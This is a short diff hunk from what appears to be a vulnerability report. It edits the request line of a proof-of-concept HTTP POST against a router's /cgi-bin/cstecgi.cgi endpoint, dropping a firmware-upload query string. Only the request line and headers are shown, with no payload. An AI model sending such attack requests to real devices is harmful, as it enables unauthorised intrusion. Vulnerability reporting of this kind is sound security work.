@@ -35,7 +35,7 @@ In order to reproduce the vulnerability, the following steps can be followed:
 2. Attack with the following POC attacks
 
 ```
-POST /cgi-bin/cstecgi.cgi?action=upload&UploadFirmwareFile HTTP/1.1
+POST /cgi-bin/cstecgi.cgi HTTP/1.1
 Host: 192.168.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
 Accept: application/json, text/javascript, */*; q=0.01
